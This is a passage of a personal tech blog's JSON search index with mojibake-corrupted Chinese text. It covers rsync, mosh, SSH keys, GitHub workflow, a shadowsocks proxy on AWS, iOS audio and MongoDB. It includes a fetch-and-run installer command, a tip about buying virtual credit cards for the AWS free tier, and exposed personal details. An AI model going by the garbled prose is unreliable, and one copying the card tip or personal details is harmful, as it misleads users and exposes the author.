pollå¤§å¦ˆä¸é™åˆ¶ç›¯ç€å¥³ç”Ÿçš„æ•°é‡, åªè¦æ˜¯ç»è¿‡å®¿èˆæ¥¼é—¨å£çš„å¥³ç”Ÿ, éƒ½ä¼šå¸®ä½ å»é—®æ˜¯ä¸æ˜¯ä½ å¥³ç¥\n\n\n\n3.3 epollå¤§å¦ˆä¸é™åˆ¶ç›¯ç€å¥³ç”Ÿçš„æ•°é‡, å¹¶ä¸”ä¹Ÿä¸éœ€è¦ä¸€ä¸ªä¸€ä¸ªå»é—®. é‚£ä¹ˆå¦‚ä½•åšå‘¢? epollå¤§å¦ˆä¼šä¸ºæ¯ä¸ªè¿›å®¿èˆæ¥¼çš„å¥³ç”Ÿè„¸ä¸Šè´´ä¸Šä¸€ä¸ªå¤§å­—æ¡,ä¸Šé¢å†™ä¸Šå¥³ç”Ÿè‡ªå·±çš„åå­—, åªè¦å¥³ç”Ÿä¸‹æ¥¼äº†, epollå¤§å¦ˆå°±çŸ¥é“è¿™ä¸ªæ˜¯ä¸æ˜¯ä½ å¥³ç¥äº†, ç„¶åå¤§å¦ˆå†é€šçŸ¥ä½ .\n\n\n\nä¸Šé¢è¿™äº›åŒæ­¥IOæœ‰ä¸€ä¸ªå…±åŒç‚¹å°±æ˜¯, å½“å¥³ç¥èµ°å‡ºå®¿èˆé—¨å£çš„æ—¶å€™, ä½ å·²ç»ç«™åœ¨å®¿èˆé—¨å£ç­‰ç€å¥³ç¥çš„, æ­¤æ—¶ä½ å±äºé˜»å¡çŠ¶æ€\n\n\n\næ¥ä¸‹æ¥æ˜¯å¼‚æ­¥IOçš„æƒ…å†µ\n\nä½ å‘Šè¯‰å¥³ç¥æˆ‘æ¥äº†, ç„¶åä½ å°±å»ç‹è€…è£è€€äº†, ä¸€ç›´åˆ°å¥³ç¥ä¸‹æ¥¼äº†, å‘ç°æ‰¾ä¸è§ä½ äº†, å¥³ç¥å†ç»™ä½ æ‰“ç”µè¯é€šçŸ¥ä½ , è¯´æˆ‘ä¸‹æ¥¼äº†, ä½ åœ¨å“ªå‘¢? è¿™æ—¶å€™ä½ æ‰æ¥åˆ°å®¿èˆé—¨å£. æ­¤æ—¶å±äºé€†è¢­åšæ³•\n\n","tags":["io"],"categories":["io"]},{"title":"rsyncåŒæ­¥æ–‡ä»¶","url":"%2Fp%2Ff67a2ed5.html","content":"\n\nå‚è€ƒé“¾æ¥: http://blog.csdn.net/zpf336/article/details/51659666\n\n\n### æŠŠæœ¬åœ°æ–‡ä»¶åŒæ­¥åˆ°è¿œç¨‹æœåŠ¡å™¨\n```\nrsync -avz '-e ssh -i /Users/liuwei/.ssh/aws.pem' /Users/liuwei/golang/src/web --progress ubuntu@54.191.9.26:/home/ubuntu\n```\n\n<!-- more -->\n### client\n\n```\nrsync -vzrtopg --progress  ubuntu@54.191.9.26::ftp .   //åŒæ­¥æœåŠ¡å™¨çš„æ–‡ä»¶åˆ°å½“å‰ç›®å½•\n```\n\n### server\n\n```\n[ftp]\n\n        comment = public archive\n        path = /home/ubuntu/rsync\n        use chroot = yes\n#       max connections=10\n        lock file = /var/lock/rsyncd\n# the default for read only is yes...\n        read only = yes\n        list = yes\n        uid = nobody\n        gid = nogroup\n#       exclude =\n#       exclude from =\n#       include =\n#       include from =\n        auth users =  ubuntu\n        secrets file = /etc/rsyncd.secrets\n        strict modes = yes\n#       hosts allow =\n#       hosts deny =\n        ignore errors = no\n        ignore nonreadable = yes\n        transfer logging = no\n#       log format = %t: host %h (%a) %o %f (%l bytes). Total %b bytes.\n        timeout = 600\n        refuse options = checksum dry-run\n        dont compress = *.gz *.tgz *.zip *.z *.rpm *.deb *.iso *.bz2 *.tbz\n\n```\n\n\n\n### åœ¨æœ¬åœ°æœºå™¨ä¸Šå¯¹ä¸¤ä¸ªç›®å½•åŒæ­¥\n\n```\nrsync -zvr filename1 filename2\n```\nä¸Šè¿°ä»£ç æ˜¯å°†filename1ä¸­çš„æ–‡ä»¶ä¸filename2ä¸­çš„æ–‡ä»¶åŒæ­¥\n\n### ä½¿ç”¨rsync â€“a åŒæ­¥ä¿ç•™æ—¶é—´æŒ‰æ ‡è®°\n\n```\nrsync -azv filename1 filename2  \n```\n\nä½¿ç”¨ä¸Šè¿°å‘½ä»¤ï¼Œå°†filename2ä¸­æ–°åŒæ­¥çš„æ–‡ä»¶çš„æ—¶é—´ä¸filename1ä¸­çš„åˆ›å»ºçš„æ—¶é—´ç›¸åŒï¼Œå®ƒä¿ç•™ç¬¦å·é“¾æ¥ã€æƒé™ã€æ—¶é—´æ ‡è®°ã€ç”¨æˆ·ååŠç»„åç›¸åŒã€‚\n\n### å°†è¿œç¨‹æœåŠ¡å™¨çš„æ–‡ä»¶åŒæ­¥åˆ°æœ¬åœ°\n\n```\nrsync -avz ubuntu@192.168.0.1:/home/ubuntu/filename2 filename1 \n```\n\nä¸Šè¿°å‘½ä»¤æ˜¯å°†è¿œç¨‹192.168.0.1çš„ä¸»æœºä¸Šfilename2åŒæ­¥åˆ°æœ¬åœ°çš„filename1ã€‚\næ³¨æ„ï¼šå¦‚æœè¿œç¨‹ä¸»æœºçš„ç«¯å£ä¸æ˜¯é»˜è®¤çš„22ç«¯å£ï¼Œå‡å¦‚æ˜¯4000ç«¯å£ï¼Œä¸Šè¿°çš„å‘½ä»¤ä¿®æ”¹ä¸ºï¼Œ\n\n```\nrsync -avz '-e ssh -p 4000' ubuntu@192.168.0.1:/home/ubuntu/filename2 filename1 \n```\n\n### ä»æœ¬åœ°åŒæ­¥æ–‡ä»¶åˆ°è¿œç¨‹æœåŠ¡å™¨\n\n```\nrsync -avz filename1 ubuntu@192.168.0.1:/home/ubuntu/filename2  \n```\nä¸Šè¿°å‘½ä»¤æ˜¯å°†æœ¬åœ°çš„filename1åŒæ­¥åˆ°è¿œç¨‹192.168.0.1çš„ä¸»æœºä¸Šã€‚\nåŒç†å¦‚æœç«¯å£ä¸æ˜¯22ï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤\n\n```\nrsync -avz '-e ssh -p 4000' filename1 ubuntu@192.168.0.1:/home/ubuntu/filename2  \n```\n","tags":["linux"],"categories":["å‘½ä»¤"]},{"title":"moshè§£å†³sshè¿œç¨‹è¿æ¥å»¶è¿Ÿ","url":"%2Fp%2F21b6636c.html","content":"\n\n### å®‰è£…mosh\n```\nsudo apt-get install mosh //server\nbrew install mobile-shell //mac\n```\n\n\n### éœ€è¦å…ˆè®¾ç½®æœ¬åœ°\nlocale-gen zh_CN.UTF-8\n\n### è¿œç¨‹æœåŠ¡å™¨å¼€å¯ mosh-server\n\n### éœ€è¦awså¼€å¯udp moshçš„ç«¯å£\n\n### å®¢æˆ·ç«¯è¿æ¥\n\n```\n mosh ubuntu@ec2-54-191-9-26.us-west-2.compute.amazonaws.com -ssh=\"ssh -i 'aws.pem'\"\n```\n","tags":["linux"],"categories":["å‘½ä»¤"]},{"title":"gitHubæäº¤PullRequest","url":"%2Fp%2Fa35ae0bf.html","content":"\n\n### forkåˆ«äººçš„ä»“åº“\né¦–å…ˆï¼Œåœ¨ GitHub ä¸Š fork åˆ°è‡ªå·±çš„ä»“åº“ï¼Œå¦‚ docker_user/blockchain_guideï¼Œç„¶å clone åˆ°æœ¬åœ°ï¼Œå¹¶è®¾ç½®ç”¨æˆ·ä¿¡æ¯ã€‚\n\n```\n$ git clone git@github.com:docker_user/blockchain_guide.git\n$ cd blockchain_guide\n$ #do some change on the content\n$ git commit -am \"Fix issue #1: change helo to hello\"\n$ git push\n```\n\n<!-- more -->\n\n### [remote rejected] master -> master (permission denied)\n\n```\nType command:\n\ngit config --global --edit\nAdd these lines of configuration at the end of file:\n\n[credential]\n  helper = osxkeychain\n  useHttpPath = true\n```\n  \n  \n### æ›´æ–°è‡ªå·±çš„ä»“åº“\n  \n  ```\n  git remote add upstream https://github.com/unix2dos/GolangWeb\n  git fetch upstream\n  git checkout master\n  git rebase upstream/master\n  git push -f origin master\n  ```\n ","tags":["git"],"categories":["git"]},{"title":"githubå’Œgiteeé€šè¿‡å¯†é’¥æ¥è¿›è¡Œsshè¿æ¥","url":"%2Fp%2Fa9407b5.html","content":"\n## ä¸€. github\n\n#### 1 ç”Ÿæˆå…¬é’¥ç§é’¥\n\n```\nssh-keygen -t rsa -b 4096 -C \"levonfly@gmail.com\"\n```\n\nç¬¬ä¸€æ­¥sava file å†™æˆgithub, å¯†ç å¯ä»¥ä¸ºç©º\n\n\n\n<!-- more -->\n\n#### 2 æ·»åŠ åˆ°githubé‡Œé¢\n\n```\ncat github.pub\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDmlu8zfJ+RuSREk0TGjuhujZbuuC1J+nAoQtkAmckfnbD8flJ6OEidSQbTqPRaQKIKObUKGobBeDWoHdJNVDGuyAPnSBnq7LI8ToKha91S4HLf8SNCtQHqCfMReNdPawav9rKN7hwos0Ho6fIMWtSRaJmZkw8gFwj4PuqfxuKzIm/hVaRCia8DJkLcyWfTYJAUkmoQHHIgJyNn0lTxs0AH0UzzfAoXiOzT6KRir5cKxhz+RCbz+ZTxmepDgM0uV/bN/rArJ/98QDknE8R4d5l88fXTR1vR98J7qgOrH+J6H15xtIInqtlGiHjv1FKu79p0t7o3WpajijiSsw8wFjlZ2Y4A8Hdm2+w7eWTUMasPbxWn4Jne2SAOWd4PsoOr3Fp0obH2RjQyibQ/WfGHHpOtJs9zGJoBs9YwmxexhhmHbCqGJ/KO6HYv9DssaLE9qG0gUshSiZtSbmaDOwttg2XfpieERrdt5SM4gsv7/MMQR5V2vZnzaKrh4++8oix48xAl27iR9qFXoqdOkXQ3CVXp15fMuQuhrzO73/mZnw8G0G5r5gzYt9ywwx+Jp9K1DLSrFESOLjAHec/8qbcSn7pUVkVkTUDvE8e+4bVnPRXe+MYa8aKybSx0OVB/foWKJlO5hgik/MHB3kVEQreoDJEv+ts5JIgEEsxtuEqfeDPdvw== levonfly@gmail.com\n```\næ·»åŠ åˆ°  https://github.com/settings/keys\n\n+ ssh-rsa è¦å¤åˆ¶\n+ é‚®ç®±ä¸å¤åˆ¶\n+ ç”Ÿæˆçš„å¯†é’¥åªèƒ½ç”¨åœ¨ä¸€ä¸ªå¸å·ä¸Šé¢\n\n\n\n\n#### 3 æµ‹è¯•æ˜¯å¦è¿æ¥åˆ°github, ç°åœ¨å¸¦ä¸Šç§é’¥\n\n```\nssh -T git@github.com -i github\n```\n\n\n#### 4 æ·»åŠ åˆ°config, gitä½¿ç”¨ç§é’¥\n\n```\nhost github.com\n HostName github.com\n IdentityFile ~/.ssh/github\n User levon\n```\n\n\n\n## äºŒ. ç äº‘\n\n#### 0 æ·»åŠ çš„æ—¶å€™ä¸€å®šè¦æ·»åŠ sshåœ°å€\n\n```\ngit remote add liuwei git@gitee.com:metrics-client-res/ReadingMate.git\n```\n\n#### 1 ç”Ÿæˆå…¬é’¥ç§é’¥\n\n```\nssh-keygen -t rsa -C \"levonfly@gmail.com\"  \n```\nç¬¬ä¸€æ­¥sava file å†™æˆmayun, å¯†ç å¯ä»¥ä¸ºç©º\n\n#### 2 æ·»åŠ åˆ°giteeé‡Œé¢\n\n```\ncat ~/.ssh/mayun.pub\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOD++FY3wmtogXUNkSVl7ZLF8jLFJsua79Tvg5ywY+YngvjCW7EsWps7M3MeVYBxht4vuFrA3qeDD3UlTE8hKJUHJaCSrfjWT/uTo9OQKK2hW/nyvNJomz5aqBoArEIPD5Ab6cqpOpMElrUDEKrfW+3FWR++mpS/ig9NNR5l2GuIYIJOt4NOkXPALd8gWjRMPedOI8MJLstK4M7BinMaoSgwOoNWYrEmDXDcJpNt7c40T83npGd5TLfN3Oq50aZwSPfzBJfDzk+kBdplrg+a7YR50TP9/URE4MKrmRToOXyVuCucRn6WTskVbt+lJqBnzO/CkTRvIeOCuaZcQqLoTH levonfly@gmail.com\n```\næ·»åŠ åˆ°åœ°å€ https://gitee.com/profile/sshkeys\n\n#### 3 æµ‹è¯•æ˜¯å¦è¿æ¥åˆ°ç äº‘, ç°åœ¨å¸¦ä¸Šç§é’¥\n\n```\nssh -T git@gitee.com -i mayun\n```\n\n#### 4 æ·»åŠ åˆ°config, gitä½¿ç”¨ç§é’¥\n\n```\nhost gitee.com\n HostName gitee.com\n IdentityFile ~/.ssh/mayun\n User levon\n```\n","tags":["git"],"categories":["git"]},{"title":"awsæ­å»ºshadowsocksæ¢¯å­ç¿»å¢™","url":"%2Fp%2F934b1a1.html","content":"\n### éƒ¨ç½²aws\n1. awså…è´¹1å¹´,ç”³è¯·çš„æ—¶å€™éœ€è¦ä¿¡ç”¨å¡,æ²¡æœ‰ä¿¡ç”¨å¡çš„å¯ä»¥æ·˜å®è´­ä¹°è™šæ‹Ÿä¿¡ç”¨å¡\n\n2. ç”³è¯·æˆåŠŸ,åˆ›å»ºEc2å®ä¾‹, ä¸‹è½½ç§é’¥, æ³¨æ„ä¿å­˜å¥½\n3. sshè¿æ¥aws, å› ä¸ºæ·˜å®è´­ä¹°çš„ä¿¡ç”¨å¡åªèƒ½åœ¨ç¾å›½2ä¸ªåœ°åŒºéƒ¨ç½², ä¸­å›½è¿æ¥ä¼šå‘ç°ç‰¹åˆ«å¡é¡¿, å¯ä»¥ç”¨moshè¿æ¥,åé¢æˆ‘ä¼šå†™æ€ä¹ˆä½¿ç”¨moshè¿æ¥\n```\nchmod 400 aws.pem\nssh -i \"aws.pem\" ubuntu@ec2-54-191-9-26.us-west-2.compute.amazonaws.com\n```\n4. ä¿®æ”¹rootå¯†ç \n```\nsudo passwd root\n```\n<!-- more -->\n-------\n\n### å®‰è£…shadowsocks\n\n1. æ›´æ–°apt-get\n```\n apt-get update\n apt-get install python-pip //å®‰è£…python-pip\n```\n\n2. å®‰è£…python-pip:\n```\nsudo apt-get purge python-pip\nwget https://bootstrap.pypa.io/get-pip.py\npython get-pip.py\nhash -r\n```\n3. å®‰è£…shadowsocks\n```\npip install shadowsocks // å®‰è£…shadowsocks\nssserver -c /etc/shadowsocks.json -d start //å¯åŠ¨shadowsocks\n```\n4. é…ç½®shadowsocks\nshadowsocks.jsonéœ€è¦è‡ªå·±åˆ›å»ºï¼Œé»˜è®¤æ˜¯æ²¡æœ‰çš„ æ³¨æ„ç«¯å£ä¿®æ”¹çš„æ˜¯server_port, local_portæ˜¯å›ºå®šçš„\n```\n{\n  \"server\": \"0.0.0.0\",\n  \"server_port\": 6789,\n  \"local_address\": \"127.0.0.1\",\n  \"local_port\": 1080,\n  \"password\": \"******\",\n  \"timeout\": 300,\n  \"method\": \"aes-256-cfb\",\n  \"fast_open\": false,\n  \"workers\": 1\n}\n```\né…ç½®ä»¥åé‡å¯shadowsocks:\n```\nsudo ssserver -c /etc/shadowsocks.json -d restart\n```\n\n\n### é…ç½®awså’Œä½¿ç”¨shadowsocksç¿»å¢™\n\nå®‰è£…ä¹‹åï¼Œæ·»åŠ æœåŠ¡å™¨ï¼Œåœ°å€ä¸ºAWSçš„å¤–ç½‘åœ°å€ï¼Œç™»å½•AWSæ§åˆ¶å°ï¼ŒæŸ¥çœ‹æ­£åœ¨è¿è¡Œä¸­çš„å®ä¾‹ï¼Œæ‰¾åˆ°å…¬æœ‰ipã€‚ ç«¯å£å·ä¸ºåˆšæ‰é…ç½®ShadowsocksæœåŠ¡å™¨æ—¶çš„ç«¯å£å·ï¼Œå¯†ç ä¹Ÿæ˜¯åˆšæ‰é…ç½®çš„ï¼Œè®¾ç½®å®Œä¹‹åä¿å­˜ã€‚\n\n![id1](awsæ­å»ºshadowsocksæ¢¯å­ç¿»å¢™/1.png)\n\n\né…ç½®å¥½shaodowsocksåï¼Œè¿˜éœ€è¦å°†é…ç½®ä¸­çš„ç«¯å£æ‰“å¼€,è¿™æ ·å®¢æˆ·ç«¯çš„æœåŠ¡æ‰èƒ½é“¾æ¥å¾—ä¸ŠEC2ä¸­çš„shadowsocksæœåŠ¡\né¦–å…ˆæ‰“å¼€æ­£åœ¨è¿è¡Œçš„å®ä¾‹ï¼Œå‘å³æ»šåŠ¨è¡¨æ ¼ï¼Œæœ€åä¸€é¡¹ï¼Œå®‰å…¨ç»„ï¼Œç‚¹å‡»è¿›å…¥ï¼Œç¼–è¾‘å…¥ç«™è§„åˆ™ï¼Œé»˜è®¤æ˜¯å¼€å¯äº†ä¸€ä¸ª22ç«¯å£ï¼ˆè¿™æ˜¯ç»™sshè®¿é—®çš„ï¼‰\n\n![id2](awsæ­å»ºshadowsocksæ¢¯å­ç¿»å¢™/2.png)\n\n\n>å¦‚æœä¸æ”¾å¿ƒæµé‡è¶…é™çš„è¯å¯ä»¥è®¾ç½®ä¸‹è´¦å•æŠ¥è­¦ã€‚\n\n","tags":["aws"],"categories":["ç§‘å­¦ä¸Šç½‘"]},{"title":"iOSå½•éŸ³é‡åˆ°çš„é—®é¢˜","url":"%2Fp%2F9ecea432.html","content":"### iOSä½¿ç”¨openALæ§åˆ¶å£°éŸ³çš„è¾“å‡ºè®¾å¤‡\né¡¹ç›®ä¸­æ’­æ”¾ioså½•éŸ³çš„æ—¶å€™ä½¿ç”¨çš„æ˜¯AVAudioç›¸å…³åº“, æ’­æ”¾éŸ³æ•ˆåˆæ˜¯ç”¨çš„openAL.\nå¦‚æœåŒæ—¶æˆ–äº¤æ›¿æ’­æ”¾è¿™ä¸¤ç±»å£°éŸ³, ä¼šé€ æˆå£°éŸ³ä¸€ä¼šä»å¬ç­’å‘å£°,ä¸€ä¼šä»æ‰¬å£°å™¨å‘å£°.\nåƒè¾›ä¸‡è‹¦æ‰¾åˆ°è§£å†³æ–¹æ¡ˆ:\n\n```cpp\nInteresting enough, it can be done!\n\nBasically you add a property listener to get route change events:\n    AudioSessionAddPropertyListener(kAudioSessionProperty_AudioRouteChange, audioRouteChangeListenerCallback,0);\n\n\tThen in the callback, determine if its a headphone being plugged-in and override the audio route:\n\t        UInt32 audioRouteOverride = kAudioSessionOverrideAudioRoute_Speaker;\n\t\t\t        AudioSessionSetProperty(kAudioSessionProperty_OverrideAudioRoute, sizeof(audioRouteOverride), &audioRouteOverride);\n\n\t\t\t\t\tToo simple...\n```\n\n\n### iOS AVAudioSession ç›‘å¬é™éŸ³å¼€å…³\nå½•éŸ³ä½¿ç”¨AVAudioSessionæ’­æ”¾çš„æ—¶å€™, æ— æ³•è¯†åˆ«Iphoneæ‰‹æœºçš„ç‰©ç†é™éŸ³å¼€å…³,éœ€è¦ä¿®æ”¹ä¸‹æ¨¡å¼\n\n\n```\n[[AVAudioSession sharedInstance] setCategory:AVAudioSessionCategoryPlayback error:nil];\n```\n\nä¿®æ”¹æˆ\n        \n```\n[[AVAudioSession sharedInstance] setCategory:AVAudioSessionCategorySoloAmbient error:nil];//ç›‘å¬é™éŸ³\n```\n\n\n\n","tags":["ios"],"categories":["ios"]},{"title":"mongodbæ“ä½œæ•™ç¨‹","url":"%2Fp%2Fd34774ef.html","content":"\n\n### æ•°æ®åº“æ“ä½œ\n\n+ åˆ›å»ºæ•°æ®åº“\n\n```\nuse study\n```\n\nå¦‚æœä½ æƒ³æŸ¥çœ‹æ‰€æœ‰æ•°æ®åº“ï¼Œå¯ä»¥ä½¿ç”¨ show dbs å‘½ä»¤ï¼š\nåˆšåˆ›å»ºçš„æ•°æ®åº“å¹¶ä¸åœ¨æ•°æ®åº“çš„åˆ—è¡¨ä¸­ï¼Œ è¦æ˜¾ç¤ºå®ƒï¼Œæˆ‘ä»¬éœ€è¦å‘ æ•°æ®åº“æ’å…¥ä¸€äº›æ•°æ®ã€‚\n\n+ æŸ¥çœ‹å½“å‰åœ¨å“ªä¸ªæ•°æ®åº“\n\n```\n> db\nstudy\n```\n<!-- more -->\n+ åˆ é™¤æ•°æ®åº“\n\n```\ndb.dropDatabase()\n```\n<!-- more -->\n### æ–‡æ¡£æ“ä½œ\n\n+ å‘æ–‡æ¡£æ’å…¥ä¸œè¥¿\n\n```\ndb.test.insert({\"name\":\"test\"})\n```\n\n+ æŸ¥è¯¢æ–‡æ¡£å†…å®¹\n\n```\n> db.test.find()\n{ \"_id\" : ObjectId(\"58da1f0e767a1e8a0cedff28\"), \"name\" : \"test\" }\n\ndb.test.find().pretty() //æ ¼å¼åŒ–è¾“å‡º\n```\n\n+ åˆ é™¤æ–‡æ¡£(æ³¨æ„è¿™ä¸ªåˆ æ‰, removeæ˜¯åˆ é™¤æ•°æ®)\n\n```\ndb.test.drop()\n```\n\n\n+ æ˜¾ç¤ºæ–‡æ¡£\n\n```\n> show tables;\nsystem.indexes\ntest\n```\n\n+ æ›´æ–°æ–‡æ¡£\n\n```\ndb.collection.update(\n   <query>,\n   <update>,\n   {\n     upsert: <boolean>,\n     multi: <boolean>,\n     writeConcern: <document>\n   }\n)\n\nå‚æ•°è¯´æ˜ï¼š\n  â— query : updateçš„æŸ¥è¯¢æ¡ä»¶ï¼Œç±»ä¼¼sql updateæŸ¥è¯¢å†…whereåé¢çš„ã€‚\n  â— update : updateçš„å¯¹è±¡å’Œä¸€äº›æ›´æ–°çš„æ“ä½œç¬¦ï¼ˆå¦‚$,$inc...ï¼‰ç­‰ï¼Œä¹Ÿå¯ä»¥ç†è§£ä¸ºsql updateæŸ¥è¯¢å†…setåé¢çš„\n  â— upsert : å¯é€‰ï¼Œè¿™ä¸ªå‚æ•°çš„æ„æ€æ˜¯ï¼Œå¦‚æœä¸å­˜åœ¨updateçš„è®°å½•ï¼Œæ˜¯å¦æ’å…¥objNew,trueä¸ºæ’å…¥ï¼Œé»˜è®¤æ˜¯falseï¼Œä¸æ’å…¥ã€‚\n  â— multi : å¯é€‰ï¼Œmongodb é»˜è®¤æ˜¯false,åªæ›´æ–°æ‰¾åˆ°çš„ç¬¬ä¸€æ¡è®°å½•ï¼Œå¦‚æœè¿™ä¸ªå‚æ•°ä¸ºtrue,å°±æŠŠæŒ‰æ¡ä»¶æŸ¥å‡ºæ¥å¤šæ¡è®°å½•å…¨éƒ¨æ›´æ–°ã€‚\n  â— writeConcern :å¯é€‰ï¼ŒæŠ›å‡ºå¼‚å¸¸çš„çº§åˆ«\n```\n\nä¾‹å­:\n\n```\ndb.col.insert({\n    title: 'MongoDB æ•™ç¨‹', \n    description: 'MongoDB æ˜¯ä¸€ä¸ª Nosql æ•°æ®åº“',\n    tags: ['mongodb', 'database', 'NoSQL'],\n    likes: 100\n})\n\ndb.col.update({'title':'MongoDB æ•™ç¨‹'},{$set:{'title':'MongoDB'}})\ndb.col.update({'title':'MongoDB æ•™ç¨‹'},{$set:{'title':'MongoDB'}},{multi:true})\n```\n\n>æ›´å¤šå®ä¾‹:\n\n```\nåªæ›´æ–°ç¬¬ä¸€æ¡è®°å½•ï¼š\ndb.col.update( { \"count\" : { $gt : 1 } } , { $set : { \"test2\" : \"OK\"} } );\nå…¨éƒ¨æ›´æ–°ï¼š\ndb.col.update( { \"count\" : { $gt : 3 } } , { $set : { \"test2\" : \"OK\"} },false,true );\nåªæ·»åŠ ç¬¬ä¸€æ¡ï¼š\ndb.col.update( { \"count\" : { $gt : 4 } } , { $set : { \"test5\" : \"OK\"} },true,false );\nå…¨éƒ¨æ·»åŠ åŠ è¿›å»:\ndb.col.update( { \"count\" : { $gt : 5 } } , { $set : { \"test5\" : \"OK\"} },true,true );\nå…¨éƒ¨æ›´æ–°ï¼š\ndb.col.update( { \"count\" : { $gt : 15 } } , { $inc : { \"count\" : 1} },false,true );\nåªæ›´æ–°ç¬¬ä¸€æ¡è®°å½•ï¼š\ndb.col.update( { \"count\" : { $gt : 10 } } , { $inc : { \"count\" : 1} },false,false );\n```\n\n+ saveæ–‡æ¡£\n\n```\ndb.collection.save(\n   <document>,\n   {\n     writeConcern: <document>\n   }\n)\n  â— document : æ–‡æ¡£æ•°æ®ã€‚\n  â— writeConcern :å¯é€‰ï¼ŒæŠ›å‡ºå¼‚å¸¸çš„çº§åˆ«ã€‚\n\nä»¥ä¸‹å®ä¾‹ä¸­æˆ‘ä»¬æ›¿æ¢äº† _id ä¸º 56064f89ade2f21f36b03136 çš„æ–‡æ¡£æ•°æ®ï¼š (é€šè¿‡æŒ‡å®šidæ›¿æ¢æ–‡æ¡£)\ndb.col.save({\n    \"_id\" : ObjectId(\"56064f89ade2f21f36b03136\"),\n    \"title\" : \"MongoDB\",\n    \"description\" : \"MongoDB æ˜¯ä¸€ä¸ª Nosql æ•°æ®åº“\",\n    \"tags\" : [\n            \"mongodb\",\n            \"NoSQL\"\n    ],\n    \"likes\" : 110\n})\n```\n\n+ remove æ–‡æ¡£\n\n```\ndb.collection.remove(\n   <query>,\n   {\n     justOne: <boolean>,\n     writeConcern: <document>\n   }\n)\n  â— query :ï¼ˆå¯é€‰ï¼‰åˆ é™¤çš„æ–‡æ¡£çš„æ¡ä»¶ã€‚\n  â— justOne : ï¼ˆå¯é€‰ï¼‰å¦‚æœè®¾ä¸º true æˆ– 1ï¼Œåˆ™åªåˆ é™¤ä¸€ä¸ªæ–‡æ¡£ã€‚\n  â— writeConcern :ï¼ˆå¯é€‰ï¼‰æŠ›å‡ºå¼‚å¸¸çš„çº§åˆ«ã€‚\n```\n\nå¦‚æœä½ æƒ³åˆ é™¤æ‰€æœ‰æ•°æ®ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹å¼ï¼ˆç±»ä¼¼å¸¸è§„ SQL çš„ truncate å‘½ä»¤ï¼‰ï¼š\n\n```\n>db.col.remove({})\n>db.col.find()\n>\n```\n\n\n\n### æ–‡æ¡£æŸ¥è¯¢\nMongoDB ä¸ RDBMS Where è¯­å¥æ¯”è¾ƒ\nå¦‚æœä½ ç†Ÿæ‚‰å¸¸è§„çš„ SQL æ•°æ®ï¼Œé€šè¿‡ä¸‹è¡¨å¯ä»¥æ›´å¥½çš„ç†è§£ MongoDB çš„æ¡ä»¶è¯­å¥æŸ¥è¯¢ï¼š\n\n```\næ“ä½œ æ ¼å¼ èŒƒä¾‹ RDBMSä¸­çš„ç±»ä¼¼è¯­å¥\nç­‰äº {<key>:<value>} db.col.find({\"by\":\"èœé¸Ÿæ•™ç¨‹\"}).pretty() where by = 'èœé¸Ÿæ•™ç¨‹'\nå°äº {<key>:{$lt:<value>}} db.col.find({\"likes\":{$lt:50}}).pretty() where likes < 50\nå°äºæˆ–ç­‰äº {<key>:{$lte:<value>}} db.col.find({\"likes\":{$lte:50}}).pretty() where likes <= 50\nå¤§äº {<key>:{$gt:<value>}} db.col.find({\"likes\":{$gt:50}}).pretty() where likes > 50\nå¤§äºæˆ–ç­‰äº {<key>:{$gte:<value>}} db.col.find({\"likes\":{$gte:50}}).pretty() where likes >= 50\nä¸ç­‰äº {<key>:{$ne:<value>}} db.col.find({\"likes\":{$ne:50}}).pretty() where likes != 50\n```\n\n+ MongoDB AND æ¡ä»¶\nMongoDB çš„ find() æ–¹æ³•å¯ä»¥ä¼ å…¥å¤šä¸ªé”®(key)ï¼Œæ¯ä¸ªé”®(key)ä»¥é€—å·éš”å¼€ï¼ŒåŠå¸¸è§„ SQL çš„ AND æ¡ä»¶ã€‚\nè¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š\n\n```\n>db.col.find({key1:value1, key2:value2}).pretty()\n```\n\n+ MongoDB OR æ¡ä»¶\nMongoDB OR æ¡ä»¶è¯­å¥ä½¿ç”¨äº†å…³é”®å­— $or,è¯­æ³•æ ¼å¼å¦‚ä¸‹ï¼š\n\n```\n>db.col.find(\n   {\n      $or: [\n\t     {key1: value1}, {key2:value2}\n      ]\n   }\n).pretty()\n```\n\n+ AND å’Œ OR è”åˆä½¿ç”¨\nä»¥ä¸‹å®ä¾‹æ¼”ç¤ºäº† AND å’Œ OR è”åˆä½¿ç”¨ï¼Œç±»ä¼¼å¸¸è§„ SQL è¯­å¥ä¸ºï¼š 'where likes>50 AND (by = 'èœé¸Ÿæ•™ç¨‹' OR title = 'MongoDB æ•™ç¨‹')'\n\n```\n>db.col.find({\"likes\": {$gt:50}, $or: [{\"by\": \"èœé¸Ÿæ•™ç¨‹\"},{\"title\": \"MongoDB æ•™ç¨‹\"}]}).pretty()\n```\n\n\n### æ“ä½œç¬¦- $type å®ä¾‹\n\n```\nç±»å‹ æ•°å­— å¤‡æ³¨\nDouble 1 \nString 2 \nObject 3 \nArray 4 \nBinary data 5 \nUndefined 6 å·²åºŸå¼ƒã€‚\nObject id 7 \nBoolean 8 \nDate 9 \nNull 10 \nRegular Expression 11 \nJavaScript 13 \nSymbol 14 \nJavaScript (with scope) 15 \n32-bit integer 16 \nTimestamp 17 \n64-bit integer 18 \nMin key 255 Query with -1.\nMax key 127 \n```\n\nå¦‚æœæƒ³è·å– \"col\" é›†åˆä¸­ title ä¸º String çš„æ•°æ®ï¼Œä½ å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š\n\n```\ndb.col.find({\"title\" : {$type : 2}})\n```\n\n+ Limit()æ–¹æ³•  \nå¦‚æœä½ éœ€è¦åœ¨MongoDBä¸­è¯»å–æŒ‡å®šæ•°é‡çš„æ•°æ®è®°å½•ï¼Œå¯ä»¥ä½¿ç”¨MongoDBçš„Limitæ–¹æ³•ï¼Œlimit()æ–¹æ³•æ¥å—ä¸€ä¸ªæ•°å­—å‚æ•°ï¼Œè¯¥å‚æ•°æŒ‡å®šä»MongoDBä¸­è¯»å–çš„è®°å½•æ¡æ•°ã€‚\n\nlimit()æ–¹æ³•åŸºæœ¬è¯­æ³•å¦‚ä¸‹æ‰€ç¤ºï¼š\n\n```\n>db.COLLECTION_NAME.find().limit(NUMBER)\n```\n\n+ Skip() 